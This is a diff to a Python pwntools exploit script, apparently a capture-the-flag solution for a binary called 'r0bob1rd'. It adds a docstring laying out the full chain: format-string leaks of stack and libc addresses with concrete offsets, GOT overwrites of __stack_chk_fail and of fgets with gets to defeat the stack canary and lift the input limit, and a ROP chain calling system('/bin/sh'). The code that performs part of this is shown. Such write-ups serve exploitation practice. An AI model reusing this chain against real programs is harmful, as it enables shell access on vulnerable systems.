@@ -1,9 +1,38 @@
+"""
+Méthode : Format string chain → GOT overwrite → Stack overwrite → ROP
+
+- GOT overwrite initial :
+  Format string offset 8
+  Overwrite __stack_chk_fail@got avec operation 
+  Bypass stack canary protection → no crash on overflow
+
+- Memory leaks :
+  Format string %22$p|%45$p| pour leak stack et libc
+  Calculate stack address leak1 - 0x1a8
+  Calculate libc base leak2 - 0x24083
+
+- GOT overwrite :
+  Overwrite fgets@got avec gets
+  Transform fgets() → gets() → no input limit → buffer overflow
+
+- Stack overwrite :
+  Format string write sur stack addresses
+  Write ROP chain directement sur la stack:
+    pop rdi; "/bin/sh"; ret; system
+  Offset stack calculé depuis leak
+
+- Trigger exploit :
+  Send "trigger" → trigger buffer overflow
+  gets() overflow → jump vers ROP chain sur la stack
+  Bypass partial RELRO via GOT overwrites
+"""
+
 #!/usr/bin/env python3
 
 from pwn import *
 
 exe = context.binary = ELF('./r0bob1rd')
-libc = ELF('./glibc/libc.so.6')  # Charge la libc
+libc = ELF('./glibc/libc.so.6') 
 context.log_level = 'info'
 
 def start(argv=[], *a, **kw):
@@ -33,7 +62,7 @@ io.recvuntil(b"hehe|")
 leaks = io.recvline().split(b"|")
 stack = int(leaks[0], 16) - 0x1a8
 libc_base = int(leaks[1], 16) - 0x24083
-libc.address = libc_base  # Maintenant ça fonctionne
+libc.address = libc_base 
 
 write = {
     exe.got["fgets"]: libc.sym["gets"]
